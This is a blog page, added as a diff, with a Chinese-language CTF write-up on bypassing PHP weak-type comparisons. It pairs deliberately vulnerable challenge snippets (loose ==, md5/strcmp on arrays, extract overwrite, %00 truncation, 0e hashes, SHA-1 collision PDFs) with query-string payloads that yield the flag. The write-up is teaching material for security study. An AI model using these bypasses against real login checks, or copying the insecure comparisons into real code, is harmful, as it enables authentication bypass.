@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -php," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言刷题刷到弱类型绕过，一时兴起，觉得这个部分也是相当有必要做总结的，就开篇博客记录一下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php弱类型绕过总结">
+<meta property="og:url" content="http://example.com/2021/12/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言刷题刷到弱类型绕过，一时兴起，觉得这个部分也是相当有必要做总结的，就开篇博客记录一下。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-12-18T12:59:01.000Z">
+<meta property="article:modified_time" content="2021-12-18T15:51:39.156Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -php">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/12/18/php弱类型绕过总结/"/>
+
+
+
+
+
+  <title>php弱类型绕过总结 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php弱类型绕过总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-12-18T20:59:01+08:00">
+                2021-12-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刷题刷到弱类型绕过，一时兴起，觉得这个部分也是相当有必要做总结的，就开篇博客记录一下。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="关于弱类型等比较"><a href="#关于弱类型等比较" class="headerlink" title="关于弱类型等比较"></a>关于弱类型等比较</h1><p>php中的等比较运算符有两种，<code>==</code>和<code>===</code>。</p>
+<ul>
+<li>==：先将左右两边类型转化成一致，再进行比较值是否一致</li>
+<li>===：先比较左右类型是否一致，若一致再比较值是否一致</li>
+</ul>
+<h1 id="字符串与数字比较"><a href="#字符串与数字比较" class="headerlink" title="字符串与数字比较"></a>字符串与数字比较</h1><h2 id="字符串与数字相等"><a href="#字符串与数字相等" class="headerlink" title="字符串与数字相等"></a>字符串与数字相等</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$key = $_GET[&#x27;key&#x27;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>key的值要与str这个字符串相等，但是key只能是数字，不过根据<code>==</code>的特性，str会被转化为数字，因此构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=123</span><br></pre></td></tr></table></figure>
+
+<h2 id="整数比大小"><a href="#整数比大小" class="headerlink" title="整数比大小"></a>整数比大小</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$temp = $_GET[&#x27;password&#x27;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class="line">if($temp&gt;1336) &#123;</span><br><span class="line">	echo $flag;</span><br></pre></td></tr></table></figure>
+<p>password的值比1336大，但是password不能为数字，同样的原理，等式两边比较时<code>==</code>会把两者变为相同的类型，构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=9999a</span><br></pre></td></tr></table></figure>
+
+<h1 id="urldecode二次编码"><a href="#urldecode二次编码" class="headerlink" title="urldecode二次编码"></a>urldecode二次编码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">	echo(&quot;not allowed!&quot;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;) &#123;</span><br><span class="line">	echo &quot;Access granted!&quot;;</span><br><span class="line">	echo &quot;flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>由于浏览器在解析URL时已经进行过一次URL解码，而程序又再次进行解码，因此二次编码URL就可以了，构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</span><br></pre></td></tr></table></figure>
+
+<h1 id="md5-sha-的绕过"><a href="#md5-sha-的绕过" class="headerlink" title="md5()/sha()的绕过"></a>md5()/sha()的绕过</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &#x27;flag&#123;test&#125;&#x27;;</span><br><span class="line">if (isset($_GET[&#x27;username&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">	if ($_GET[&#x27;username&#x27;] == $_GET[&#x27;password&#x27;])</span><br><span class="line">	      print &#x27;Your password can not be your username.&#x27;;</span><br><span class="line">    else if (md5($_GET[&#x27;username&#x27;]) === md5($_GET[&#x27;password&#x27;]))</span><br><span class="line">	      die(&#x27;Flag: &#x27;.$flag);</span><br><span class="line">    else</span><br><span class="line">	      print &#x27;Invalid password&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>当要输入两个值，这两个值不能一致但是其md5/sha编码后的值要相等，这里有两种解题方法：</p>
+<ol>
+<li><p>数组法<br>md5()/sha()这类函数无法处理数组，如果传入的是数组,md5()返回NULL，加密后得到的也是NULL，满足两个md5值相等；sha()返回false，使条件成立，构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></li>
+<li><p>pdf法<br>这个方法之前提到过，当数组被过滤或者md5/sha值不能为空时，就要用到google放出两个md5/sha1值相同而不一样(sha256的值不通)的pdf文件。原理可以参考这篇博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/caiqiiqi/article/details/68953730">关于SHA1碰撞——比较两个binary的不同之处</a>，构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 </span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">	if (strcmp($_GET[&#x27;a&#x27;], $flag) == 0)</span><br><span class="line">	    die(&#x27;Flag: &#x27;.$flag); </span><br><span class="line">    else</span><br><span class="line">		print &#x27;No&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里用strcmp()对两个字符串进行了比较（区分大小写）。</p>
+<p>strcmp(string1,string2)，该函数返回：</p>
+<ul>
+<li>0 - 如果两个字符串相等</li>
+<li>&lt;0 - 如果 string1 小于 string2</li>
+<li><blockquote>
+<p>0 - 如果 string1 大于 string2</p>
+</blockquote>
+</li>
+</ul>
+<p>对于传入非字符串类型的数据的时候，strcmp函数会报错，将返回0。所以，strcmp()在比较字符串和数组的时候直接返回0，这样通过把目标变量设置成数组就可以绕过该函数的限制，构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1</span><br></pre></td></tr></table></figure>
+
+<h1 id="过滤数字进行比较"><a href="#过滤数字进行比较" class="headerlink" title="过滤数字进行比较"></a>过滤数字进行比较</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp) &#123;</span><br><span class="line">	$flag = &#x27;flag&#123;test&#125;&#x27;;</span><br><span class="line">	$one = ord(&#x27;1&#x27;);</span><br><span class="line">	$nine = ord(&#x27;9&#x27;);</span><br><span class="line">	$number = &#x27;3735929054&#x27;;</span><br><span class="line">	// Check all the input characters!</span><br><span class="line">	for ($i = 0; $i &lt; strlen($number); $i++) &#123;</span><br><span class="line">		// Disallow all the digits!</span><br><span class="line">		$digit = ord($temp &#123;$i&#125;);</span><br><span class="line">		if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123;</span><br><span class="line">			// Aha, digit not allowed!</span><br><span class="line">			return &quot;flase&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if($number == $temp)</span><br><span class="line">	return $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[&#x27;password&#x27;];</span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>ord()：返回字符的ascii码值。</p>
+<p>这里过滤了1-9的数字，又要求传入password的值为3735929054，这里需要将值化成十六进制再传入，构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=0xdeadc0de</span><br></pre></td></tr></table></figure>
+
+<h1 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&#x27;xxx&#x27;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan)) &#123;</span><br><span class="line">	$content=trim(file_get_contents($flag));</span><br><span class="line">	if($shiyan==$content) &#123;</span><br><span class="line">		echo&#x27;flag&#123;xxx&#125;&#x27;;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo&#x27;Oh.no&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>extract():函数从数组中将变量导入到当前的符号表<br>trim(string[,charlist]):移除字符串两侧的空白字符或其他预定义字符，若省略后面一个参数，则去除<code>\0</code>、<code>\t</code>、<code>\n</code>、<code>\x0B</code>、<code>\r</code>和空格。</p>
+<p>运用extract()将GET方式获得的变量导入到当前的符号表中，然后判断$ flag和$shiyan两个变量的内容是否相等。那么我们将$flag和$shiyan这两个变量的内容都会被设置成空字符串。构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:?flag=&amp;shiyan=</span><br></pre></td></tr></table></figure>
+
+<h1 id="限制传入的匹配"><a href="#限制传入的匹配" class="headerlink" title="限制传入的匹配"></a>限制传入的匹配</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset ($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">	if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE)</span><br><span class="line">	     echo &#x27;You password must be alphanumeric&#x27;;</span><br><span class="line">    else if (strpos ($_GET[&#x27;password&#x27;], &#x27;--&#x27;) !== FALSE)</span><br><span class="line">	     die(&#x27;Flag: &#x27; . $flag);</span><br><span class="line">    else</span><br><span class="line">	     echo &#x27;Invalid password&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>ereg()：限制传入内容，例如上面就是限制了只能传入数字以及大小写字母。<br>strpos()：查找字符串在另一字符串中第一次出现的位置。</p>
+<p>对传入进行限制，但是又要求密码中含有–，因此我们这里有两种绕过方法：</p>
+<ol>
+<li><p>数组法<br>同样strpos()如果传入数组，会返回NULL，从而绕过对<code>--</code>的检测，构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password[]=1</span><br></pre></td></tr></table></figure></li>
+<li><p>截断法<br>在<code>%00</code>后的函数无法识别，因此构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=1%00--</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;message&#x27;])) &#123;</span><br><span class="line">    $message = json_decode($_POST[&#x27;message&#x27;]);</span><br><span class="line">    $key =&quot;*********&quot;;</span><br><span class="line">    if ($message-&gt;key == $key) &#123;</span><br><span class="line">        echo &quot;flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">     echo &quot;~~~~&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输入一个数组进行json解码，解码后的message与key值相同才会得到flag，使用弱类型进行绕过，key肯定是字符串，两个等号时会转化成同一类型再进行比较，直接构造一个0就可以相等了，通过0==”admin”这种形式绕过，构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=&#123;&quot;key&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="科学计数法"><a href="#科学计数法" class="headerlink" title="科学计数法"></a>科学计数法</h1><h2 id="编码加密相等"><a href="#编码加密相等" class="headerlink" title="编码加密相等"></a>编码加密相等</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ($_GET[&quot;a&quot;] != hash(&quot;md4&quot;, $_GET[&quot;a&quot;])) &#123;</span><br><span class="line">	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">	die(&#x27;Theshy is locked&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使传入的参数a与经过md4编码后的值相同，这里我们找以0e开头，以及经过md4编码后仍然以0e开头的a值，构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=0e251288019</span><br></pre></td></tr></table></figure>
+
+<h2 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;xxx&quot;;</span><br><span class="line">if (isset ($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">	if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123;</span><br><span class="line">		echo &#x27;You password must be alphanumeric&#x27;;</span><br><span class="line">	&#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123;</span><br><span class="line">		if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos — 查找字符串首次出现的位置 &#123;</span><br><span class="line">			die(&#x27;Flag: &#x27; . $flag);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			echo(&#x27;have not been found&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &#x27;Invalid password&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>要求输入password的长度小于8位，且值要大于9999999，并且需要匹配到<code>-</code>，这里就要用到科学计数法了：</p>
+<ul>
+<li>1e10 = 10^10</li>
+</ul>
+<p>由于还限制了输入内容，因此还需要进行%00截断，构建payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=1e10%00-</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以上这些便是常见的php弱类型的绕过，以上代码来源均为bugkuctf-代码审计有兴趣的可以自己去尝试。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-php/" rel="tag"># -web -php</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/12/18/buu%E7%BB%83%E4%B9%A0/" rel="next" title="buu练习">
+                <i class="fa fa-chevron-left"></i> buu练习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
